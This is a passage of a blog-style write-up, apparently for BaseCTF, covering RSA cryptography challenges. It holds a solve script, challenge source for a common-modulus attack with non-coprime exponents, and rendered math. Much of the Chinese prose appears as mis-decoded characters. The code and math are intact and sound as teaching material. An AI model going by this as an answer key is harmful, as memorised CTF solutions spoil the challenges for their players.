54297831548863701092644190086258072883163378307246681513317422545902442650340916001357605211715836911877651782099787873046987096258918495734824011752504203578982947618784736181975847356304742402103468329660346526185908618978851982007496096394151821403282347897417590596861323293706611997134962231129075032641</span><br><span class="hljs-string">x = 40635864473997460751766935373772107585133301579524000836637683731949939348171187931595274511243052505604832873086269554842194695737052043633079044688826020656068356561856848814530947955429343483847291398607359454851926470168457852479044154798114087493843073091985855839008222762224952503563764527380033064437</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>n</mi><mo>=</mo><mi>c</mi><mo>+</mo><mi>a</mi><mspace linebreak="newline"></mspace><mi>x</mi><mo>=</mo><msup><mi>n</mi><mi>e</mi></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>äºŒé¡¹å¼å®šç†ï¼š</mtext><mi>x</mi><mo>=</mo><msup><mi>a</mi><mi>e</mi></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>e</mi><mo>âˆ—</mo><msub><mi>d</mi><mi>c</mi></msub><mo>=</mo><mn>1</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>Ï•</mi><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msup><mi>x</mi><msub><mi>d</mi><mi>c</mi></msub></msup><mo>=</mo><msup><mi>a</mi><mrow><mi>e</mi><mo>âˆ—</mo><msub><mi>d</mi><mi>c</mi></msub></mrow></msup><mo>=</mo><mi>a</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n=c+a\\x=n^e\quad mod(c)\\äºŒé¡¹å¼å®šç†ï¼šx=a^e\quad mod(c)\\e*d_c=1\quad mod(\phi(c))\\x^{d_c}=a^{e*d_c}=a\quad mod(c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">äºŒ</span><span class="mord cjk_fallback">é¡¹</span><span class="mord cjk_fallback">å¼</span><span class="mord cjk_fallback">å®š</span><span class="mord cjk_fallback">ç†</span><span class="mord cjk_fallback">ï¼š</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.899108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.899108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.899108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.899108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight">âˆ—</span><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï•</mi><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span>å¯ä»¥é€šè¿‡ç½‘ç«™åœ¨çº¿åˆ†è§£</p><p>ä¹Ÿå¯ä»¥ç›´æ¥åˆ©ç”¨sageä¸­euler_phi()æ±‚è§£ï¼Œå°±æ˜¯æ—¶é—´æœ‰ç‚¹ä¹…</p><blockquote><p><a href="http://www.factordb.com/index.php">factordb.com</a></p></blockquote><p>ä¹‹åç»™äº†då°±æ­£å¸¸è§£äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>c = <span class="hljs-number">52453423663797600504896811946820841317615798875871627840172711423749946998217916744135290476795328543876098295227017753117609268701786914053599060330837226980969490439739651088710549890669593587642238827462108900683237797139569260570711611781514337884756698142193277516649805710242748531658979160170193283558</span><br>e = <span class="hljs-number">65537</span><br>d = <span class="hljs-number">54297831548863701092644190086258072883163378307246681513317422545902442650340916001357605211715836911877651782099787873046987096258918495734824011752504203578982947618784736181975847356304742402103468329660346526185908618978851982007496096394151821403282347897417590596861323293706611997134962231129075032641</span><br>x = <span class="hljs-number">40635864473997460751766935373772107585133301579524000836637683731949939348171187931595274511243052505604832873086269554842194695737052043633079044688826020656068356561856848814530947955429343483847291398607359454851926470168457852479044154798114087493843073091985855839008222762224952503563764527380033064437</span><br><br>phic=(<span class="hljs-number">2</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">3</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">73</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">3967</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">6373</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">95592293</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">216465863</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">4744823012787277141</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">48245998253859255581546561942142167304434549996919484957120717763726325509833409296170471619434291990255044694414983821250538266717293535917534918221352198192885071310932646412147737114561229291373456448363184353049796801297876664512630305475226391199481032049429</span>-<span class="hljs-number">1</span>)<br><span class="hljs-comment">#phic=euler_phi(c)</span><br>dc=gmpy2.invert(e,phic)<br>a=<span class="hljs-built_in">pow</span>(x,dc,c)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,a+c)))<br></code></pre></td></tr></table></figure><h3 id="exgcd"><a class="markdownIt-Anchor" href="#exgcd"></a> exgcd</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span><br>m=bytes_to_long(flag)<br><br>p=getPrime(<span class="hljs-number">1024</span>)<br>q=getPrime(<span class="hljs-number">1024</span>)<br><br>n=p*q<br>e1=<span class="hljs-number">3747</span><br>e2=<span class="hljs-number">2991</span><br><br>c1=<span class="hljs-built_in">pow</span>(m,e1,n)<br>c2=<span class="hljs-built_in">pow</span>(m,e2,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e1 =&quot;</span>,e1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e2 =&quot;</span>,e2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c1 =&quot;</span>,c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c2 =&quot;</span>,c2)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">n = 27855350163093443890983002241607629119744539643165776358993469078731521668677421483556132628708836721737685936980427467856642738196111748018522018598646125626995613169001111504706363742194664774823604738939411512861441742683157275818500991834651769368178320088982759626122029956515159435424882855075032400667120376075618896752694718491438251810609878021717559466498493103257912108879328270813061231904227056671621363669388496383136964549879459562004569059185078204867346250733489663015417879915436157806942021693920206071715538430633494012923651469196048546309592946901609803631751035364478773126967010589504275776307</span><br><span class="hljs-string">e1 = 3747</span><br><span class="hljs-string">e2 = 2991</span><br><span class="hljs-string">c1 = 24426579024062518665031958216110619832653602343205488454298659533869220501923184793828421371206493659949730138867555889074137026401207985428160803910695088081370233571905915349589146504374710444468715701305061060934519410886010929009297226496448218819742287990364436349188987723637449590579092391100714056589967894609950537021838172987840638735592599678186555961654312442380755963257875487240962193060914793587712733601168204859917001269928487633954556221987632934190217367502677285906521385169669644977192556145782303526375491484736352799180747403161343130663661867413380222714012960607473395828938694285120527085083</span><br><span class="hljs-string">c2 = 6932145147126610816836065944280934160173362059462927112752295077225965836502881335565881607385328990881865436690904056577675885697508058289570333933837515526915707121125766720407153139160751343352211421901876051228566093038929625042619250168565502734932197817082848506826847112949495527533238122893297049985517280574646627011986403578166952789317461581409161873814203023736604394085875778774834314777046086921852377348590998381648241629124408514875110073073851913857329679268519229436092660959841766848676678740851087184214283196544821779336090434587905158006710112461778939184327386306992082433561460542130441825293</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>å…±æ¨¡æ”»å‡»ï¼Œä½†$$e_1å’Œe_2ä¸äº’ç´ $$</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>m</mi><mrow><mi>e</mi><mn>1</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi><mspace linebreak="newline"></mspace><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><msup><mi>m</mi><mrow><mi>e</mi><mn>2</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi><mspace linebreak="newline"></mspace><mtext>é€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾—è®¡ç®—ï¼š</mtext><msub><mi>s</mi><mn>1</mn></msub><mo>âˆ—</mo><msub><mi>e</mi><mn>1</mn></msub><mo>+</mo><msub><mi>s</mi><mn>2</mn></msub><mo>âˆ—</mo><msub><mi>e</mi><mn>2</mn></msub><mo>=</mo><mi>s</mi><mspace linebreak="newline"></mspace><msubsup><mi>c</mi><mn>1</mn><msub><mi>s</mi><mn>1</mn></msub></msubsup><mo>âˆ—</mo><msubsup><mi>c</mi><mn>2</mn><msub><mi>s</mi><mn>2</mn></msub></msubsup><mo>=</mo><msup><mi>m</mi><mrow><msub><mi>s</mi><mn>1</mn></msub><mo>âˆ—</mo><msub><mi>e</mi><mn>1</mn></msub><mo>+</mo><msub><mi>s</mi><mn>2</mn></msub><mo>âˆ—</mo><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mo>=</mo><msup><mi>m</mi><mi>s</mi></msup></mrow><annotation encoding="application/x-tex">c_1=m^{e1}\mod n\\c_2=m^{e2}\mod n\\é€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾—è®¡ç®—ï¼šs_1*e_1+s_2*e_2=s\\c_1^{s_1}*c_2^{s_2}=m^{s_1*e_1+s_2*e_2}=m^s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">é€š</span><span class="mord cjk_fallback">è¿‡</span><span class="mord cjk_fallback">æ‰©</span><span class="mord cjk_fallback">å±•</span><span class="mord cjk_fallback">æ¬§</span><span class="mord cjk_fallback">å‡ </span><span class="mord cjk_fallback">é‡Œ</span><span class="mord cjk_fallback">å¾—</span><span class="mord cjk_fallback">è®¡</span><span class="mord cjk_fallback">ç®—</span><span class="mord cjk_fallback">ï¼š</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">s</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.26630799999999993em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.26630799999999993em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.821331em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.821331em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">âˆ—</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">âˆ—</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" 